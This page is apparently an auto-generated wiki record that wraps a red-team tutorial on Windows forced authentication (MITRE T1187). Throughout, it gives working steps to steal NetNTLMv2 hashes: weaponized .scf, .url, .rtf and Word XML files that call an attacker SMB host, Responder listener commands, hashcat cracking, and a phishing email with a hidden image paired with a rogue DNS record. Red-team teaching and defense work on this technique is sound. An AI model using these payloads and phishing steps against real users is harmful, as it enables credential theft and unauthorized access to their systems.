---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Forced Authentication

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-initial-access-t1187-forced-authentication` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/t1187-forced-authentication.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Forced Authentication](../../topics/offensive-security/forced-authentication.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-initial-access-t1187-forced-authentication |
| name | Forced Authentication |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/initial-access/t1187-forced-authentication.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2018-12-09 16-44.gif
- Peek 2018-12-09 17-04.gif
- Screenshot from 2018-12-09 16-23-39.png
- Screenshot from 2018-12-09 17-01-11.png
- Screenshot from 2018-12-09 17-02-32.png
- forced-auth-cracked.png
- forced-auth-downloads.png
- forced-auth-hashes.png
- forced-auth-scf.png
- forced-auth-shares.png
- forced-auth-shell (1).png
- forced-auth-word.png
- forced-authentication-url.gif
- harvest-hash-shortcut.gif
- image (791).png
- rtf-hashes.gif
_body: "---\ndescription: Credential Access, Stealing hashes\n---\n\n# Forced Authentication\n\n## Execution via Hyperlink\n\
  \nLet's create a Word document that has a hyperlink to our attacking server where  `responder` will be listening on port\
  \ 445:\n\n![](../../.gitbook/assets/forced-auth-word.png)\n\n{% file src=\"../../.gitbook/assets/Totes not a scam.docx\"\
  \ %}\nForced SMBv2 Authentication - MS Word File\n{% endfile %}\n\nLet's start `Responder` on our kali box:\n\n{% code title=\"\
  attacker@local\" %}\n```csharp\nresponder -I eth1\n```\n{% endcode %}\n\nOnce the link in the document is clicked, the target\
  \ system sends an authentication request to the attacking host. Since responder is listening on the other end, victim's\
  \ `NetNTLMv2` hash is captured:\n\n![](../../.gitbook/assets/forced-auth-hashes.png)\n\nThe retrieved hash can then be cracked\
  \ offline with hashcat:\n\n```csharp\nhashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/share/wordlists/rockyou.txt\
  \ --force\n```\n\nSuccess, the password is cracked:\n\n![](../../.gitbook/assets/forced-auth-cracked.png)\n\nUsing the cracked\
  \ passsword to get a shell on the victim system:\n\n![](<../../.gitbook/assets/forced-auth-shell (1).png>)\n\n## Execution\
  \ via .SCF\n\nPlace the below `fa.scf` file on the attacker controlled machine at `10.0.0.7` in a shared folder `tools`\n\
  \n{% code title=\"\\\\10.0.0.7\\tools\\fa.scf\" %}\n```csharp\n[Shell]\nCommand=2\nIconFile=\\\\10.0.0.5\\tools\\nc.ico\n\
  [Taskbar]\nCommand=ToggleDesktop\n```\n{% endcode %}\n\n{% file src=\"../../.gitbook/assets/@fa.scf\" %}\nfa.scf\n{% endfile\
  \ %}\n\nA victim user `low` opens the share `\\\\10.0.0.7\\tools` and the `fa.scf` gets executed automatically, which in\
  \ turn forces the victim system to attempt to authenticate to the attacking system at 10.0.0.5 where responder is listening:\n\
  \n![victim opens \\\\\\10.0.0.7\\tools, fa.scf executes and gives away low's hashes](../../.gitbook/assets/forced-auth-shares.png)\n\
  \n![user's low hashes were received by the attacker](../../.gitbook/assets/forced-auth-scf.png)\n\nWhat's interesting with\
  \ the `.scf` attack is that the file could easily be downloaded through the browser and as soon as the user navigates to\
  \ the `Downloads` folder, users's hash is stolen:\n\n![](../../.gitbook/assets/forced-auth-downloads.png)\n\n## Execution\
  \ via .URL\n\nCreate a weaponized .url file and upload it to the victim system:\n\n{% code title=\"c:\\link.url@victim\"\
  \ %}\n```csharp\n[InternetShortcut]\nURL=whatever\nWorkingDirectory=whatever\nIconFile=\\\\10.0.0.5\\%USERNAME%.icon\nIconIndex=1\n\
  ```\n{% endcode %}\n\nCreate a listener on the attacking system:\n\n{% code title=\"attacker@local\" %}\n```\nresponder\
  \ -I eth1 -v\n```\n{% endcode %}\n\nOnce the victim navigates to the C:\\ where `link.url` file is placed, the OS tries\
  \ to authenticate to the attacker's malicious SMB listener on `10.0.0.5` where NetNTLMv2 hash is captured:\n\n![](../../.gitbook/assets/forced-authentication-url.gif)\n\
  \n## Execution via .RTF\n\nWeaponizing .rtf file, which will attempt to load an image from the attacking system:\n\n{% code\
  \ title=\"file.rtf\" %}\n```csharp\n{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE \"file://10.0.0.5/test.jpg\" \\\\* MERGEFORMAT\\\
  \\d}}{\\fldrslt}}}\n```\n{% endcode %}\n\nStarting authentication listener on the attacking system:\n\n{% code title=\"\
  attacker@local\" %}\n```\nresponder -I eth1 -v\n```\n{% endcode %}\n\nExecuting the file.rtf on the victim system gives\
  \ away user's hashes:\n\n![](../../.gitbook/assets/rtf-hashes.gif)\n\n## Execution via .XML\n\nMS Word Documents can be\
  \ saved as .xml:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-09 16-23-39.png>)\n\nThis can be exploited by including\
  \ a tag that requests the document stylesheet (line 3) from an attacker controlled server. The victim system will share\
  \ its NetNTLM hashes with the attacker when attempting to authenticate to the attacker's system:\n\n```markup\n<?xml version=\"\
  1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<?mso-application progid=\"Word.Document\"?>\n<?xml-stylesheet type=\"text/xsl\"\
  \ href=\"\\\\10.0.0.5\\bad.xsl\" ?>\n```\n\nBelow is the attack illustrated:\n\n![](<../../.gitbook/assets/Peek 2018-12-09\
  \ 16-44.gif>)\n\n{% file src=\"../../.gitbook/assets/test-xls-stylesheet (1).xml\" %}\ntest-xls-stylesheet.xml\n{% endfile\
  \ %}\n\n## Execution via Field IncludePicture\n\nCreate a new Word document and insert a new field `IncludePicture`:\n\n\
  ![](<../../.gitbook/assets/Screenshot from 2018-12-09 17-01-11.png>)\n\nSave the file as .xml. Note that the sneaky image\
  \ url is present in the XML:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-09 17-02-32.png>)\n\nLaunching the document\
  \ gives away victim's hashes immediately:\n\n![](<../../.gitbook/assets/Peek 2018-12-09 17-04.gif>)\n\n{% file src=\"../../.gitbook/assets/smb-image.xml\"\
  \ %}\nsmb-image.xml\n{% endfile %}\n\n## Execution via HTTP Image and Internal DNS\n\nIf we have a foothold in a network,\
  \ we can do the following:\n\n* Create a new DNS A record (any authenticated user can do it) inside the domain, say `offense.local`,\
  \ you have a foothold in, and point it to your external server, say `1.1.1.1`\n  * Use [PowerMad](https://github.com/Kevin-Robertson/Powermad)\
  \ to do this with: `Invoke-DNSUpdate -dnsname vpn -dnsdata 1.1.1.1`\n* On your controlled server 1.1.1.1, start `Responder`\
  \ and listen for HTTP connections on port 80\n* Create a phishing email, that contains `<img src=\"http://vpn.offense.local\"\
  />`&#x20;\n  * Feel free to make the image 1x1 px or hidden\n  * Note that `http://vpn.offense.local` resolves to `1.1.1.1`\
  \ (where your Responder is listening on port 80), but only from inside the `offense.local` domain\n* Send the phish to target\
  \ users from the `offense.local` domain\n* Phish recipients view the email, which automatically attemps to load the image\
  \ from `http://vpn.offense.local`, which resolves to `http://1.1.1.1` (where Responder is litening on port 80)\n* Responder\
  \ catches NetNLTMv2 hashes for the targeted users with no user interaction required\n* Start cracking the hashes\n* Hopefully\
  \ profit\n\n## Farmer WebDav\n\nWhen inside a network, we can attempt to force hash leaks from other users by forcing them\
  \ to authenticate to our WebDav server that we can bind to any an unused port without administrator privileges. To achieve\
  \ this, we can use a tool called [Farmer](https://github.com/mdsecactivebreach/Farmer) by [@domchell](https://twitter.com/domchell?s=20).\n\
  \nBelow will make the farmer listen on port 7443:\n\n```\nFarmer.exe 7443\n```\n\nBelow shows how the Farmer successfully\
  \ collects a hash for the user `spotless` when they are forced to authenticate to the malicious webdav when `ls \\\\spotless@7443\\\
  spotless.png` is executed:\n\n![](<../../.gitbook/assets/image (791).png>)\n\nBelow shows how the Farmer successfully collects\
  \ a hash from user `spotless` via a shortcut icon that points to our malicious webdav at `\\\\spotless@3443\\spotless.png`:\n\
  \n![](../../.gitbook/assets/harvest-hash-shortcut.gif)\n\n## References\n\n{% embed url=\"http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf\"\
  \ %}\n\n{% embed url=\"https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/\"\
  \ %}\n\n{% embed url=\"https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/\" %}\n\n{% embed url=\"https://medium.com/@markmotig/a-better-way-to-capture-hashes-with-no-user-interaction-by-markmo-bd1569bfa208\"\
  \ %}\n\n{% embed url=\"https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/\" %}\n\n{%\
  \ embed url=\"https://twitter.com/bohops/status/1062935197107322880?s=12\" %}\n\n{% embed url=\"https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html\"\
  \ %}\n\n{% embed url=\"https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/\" %}"
_relative_path: offensive-security/initial-access/t1187-forced-authentication.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/t1187-forced-authentication.md
````
